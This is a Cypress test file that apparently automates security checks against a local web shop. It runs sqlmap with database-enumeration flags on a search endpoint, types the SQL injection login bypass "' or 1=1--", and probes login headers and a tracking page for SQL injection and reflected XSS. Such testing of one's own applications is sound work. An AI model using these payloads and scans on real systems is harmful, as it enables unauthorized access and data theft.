import '../support/index';
/// <reference types="./../support/index.d.ts" />
describe('execute sqlmap in different ways', () => {
  beforeEach(() => {
    cy.visit('/#/login') // #/form/new-
  })
  it('should execute sqlmap from test file', () => {
    // execute sqlmap from cypress test specification
    const route = 'http://localhost:3000/rest/products/search?q=';
    const args = [' --dbs --level=3 --risk=3 --batch'];
    cy.sqlMap({route, args})
    const peach = [' --schema'];
    cy.sqlMap({route, args: [' --schema']}) // --batch?
    //cy.task('sqlMap', {route: 'http://localhost:3000/rest/products/search?q=', args: [' --dbs --level=3 --risk=3 --batch'] })
    //cy.task('sqlMap', {route: 'http://localhost:3000/rest/products/search?q=', args: [' --schema'] })

    // cy.sqlInject({ route: 'http://localhost:3000/rest/products/search?q=', args: [' --dbs --level=3 --risk=3 --batch'] })
  })

  it('should test an endpoint for sql injection', () => {
    // modify the request!!!
    cy.intercept('POST', '/rest/user/login').as('interceptedRequest')
    cy.get('.close-dialog').click()
    cy.get('#email').type("' or 1=1--")
    cy.get('#password').type('a')
    cy.get('#loginButton').click()
    // cy.wait('@interceptedLogin') // waits for login request to be intercepted
    // cy.get('input.my-cool-formclass').sho

    cy.wait('@interceptedRequest').then((request) => {
      console.log(request)
      const postParams = ['email', 'password']
      const injectable = 'email';
      console.log(postParams)
      // const expectedStatus = 200
      cy.checkEndpoint(request, injectable)
      // cy.task('checkEndpoint', {request, method, endpoint, postParams})// -> this works!!!! YYYYYYYYYYY
      // cy.task('AnalyseRequests', request)
      // method, params/body
    })
  })
  it('should test for sqli using the header', () => {
    cy.intercept('POST', 'http://localhost:3000/rest/user/login').as('interceptedLogin')
    cy.get('.close-dialog').click()
    cy.get('#email').type('baran@bb.com')
    cy.get('#password').type('aaaa')
    cy.get('#loginButton').click()
    // cy.wait('@interceptedLogin') // waits for login request to be intercepted
    cy.wait('@interceptedLogin').then((request) => {
      const headers = ['cookie', 'x-forwarded-for', 'user-agent']
      // const values = ['xxx', 'yyy', 'zzz']
      // cy.task('HeaderSQLi', { request, headers })
      cy.headerSQLi(request, headers)
      // cy.task('AnalyseRequests', request)
      // method, params/body
    })
  })
  it('should test an input field for XSS', () => {
    cy.intercept('GET', '/rest/track-order/**').as('interceptedRequest')
    cy.get('.close-dialog').click()
    cy.get('#email').type("' or 1=1--")
    cy.get('#password').type('a')
    cy.get('#loginButton').click()
    cy.visit('/#/track-result?id=5267-5880470cd9a61ffb')
    cy.wait('@interceptedRequest').then((request) => {
      // cy.task('reflectedXSS', {request})
      cy.reflectedXSS(request);
    })
  })
})
